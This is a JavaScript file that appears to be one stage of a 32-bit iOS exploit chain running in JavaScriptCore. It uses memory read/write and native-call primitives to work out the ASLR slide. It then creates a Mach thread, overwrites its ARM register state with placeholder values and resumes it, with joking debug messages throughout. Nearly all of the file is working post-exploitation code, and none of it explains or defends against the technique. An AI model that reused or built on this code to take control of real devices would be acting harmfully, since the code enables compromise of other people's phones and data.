/*
 *  november 24th 2021
 *  [3:16 PM] spv: spice confuses the shit out of me, so i'm prolly not smart enough to implement it anyway
 *
 *  ohai
 */

var MAX_SLIDE = 0x3;
var MIN_SLIDE = 0x1;

var ARM_THREAD_STATE = 0x1;
var ARM_THREAD_STATE_COUNT = 0x11;

try {
	log("we out here in jsc");
} catch (e) {
	/*
	 *  we don't have log. :(
	 */

	log = function (){};
}

function main() {
	/*
	 *  get slide and calculate slid base
	 *  remember, 32-bit *OS defaults to 0x4000 for the unslid base for exec's
	 * 
	 *  so, take the slide, shift it by 12 bits (aslr is calc'd by taking a
	 *  random byte and shifting it 12 bits, in this case the page size, 4096
	 *  (0x1000) bytes), and add it to the unslid base.
	 */

	slide = get_our_slide();
	base = 0x4000 + (slide << 12);
	slid = (slide << 12);
	mytask = 0;
	count = 0x130000;
	th = 0x130100;
//	thread_state_ptr = 0x130008;
	thread_state = 0x130200;
	countptr = 0x131000;
	thptr = 0x131004;
	thread_stateptr = 0x131008;

	countptrptr = 0x132000;
	thptrptr = 0x132004;
	thread_stateptrptr = 0x132008;

	write_u32(countptr, count);
	write_u32(thptr, th);
	write_u32(thread_stateptr, thread_state);

	write_u32(countptrptr, countptr);
	write_u32(thptrptr, thptr);
	write_u32(thread_stateptrptr, thread_stateptr);

	init_sptr_heap();

	puts("we out here");
	puts("I came through a portal holding a 40 and a blunt. Do you really wanna test me right now?");

	printf("slide=0x%x\n", slide);
	printf("*(uint8_t*)base = 0x%x\n", read_u8(base));
	printf("*(uint16_t*)base = 0x%x\n", read_u16(base));
	printf("*(uint32_t*)base = 0x%x\n", read_u32(base));

	puts("alive");
	mytask = calls4arg("mach_task_self", 0, 0, 0, 0);

	printf("%x %x %x\n", mytask, thptr, th);
	printf("%x %x\n", thread_stateptr, countptr);

	puts("alive");
	calls4arg("thread_create", mytask, th, 0, 0);
	printf("mytask=%x th=%x\n", mytask, read_u32(th));
	puts("alive");
	calls4arg("thread_get_state", thptr, ARM_THREAD_STATE, thread_stateptrptr, countptr);
	printf("thread_state=%x\n", read_u32(thread_state));
	puts("alive");
	for (var i = 0; i < 16; i++) {
		write_u32(thread_state + (i << 2), 0x41414140 + i);
	}
	printf("thread_state=%x\n", read_u32(thread_state));
	puts("alive");
	calls4arg("thread_set_state", thptr, ARM_THREAD_STATE, thread_stateptrptr, ARM_THREAD_STATE_COUNT);
	puts("alive");
	calls4arg("thread_resume", thptr, 0, 0, 0);
	puts("alive");

//	var i = 0;
//	while (true) {
//		calls4arg("syslog", 0x28, sptr("get rekt from jsc %d (slide=%x)\n"), i, slide);
//		calls4arg("sleep", 1, 0, 0, 0);
//		i++;
//	}

	log("still alive");
};
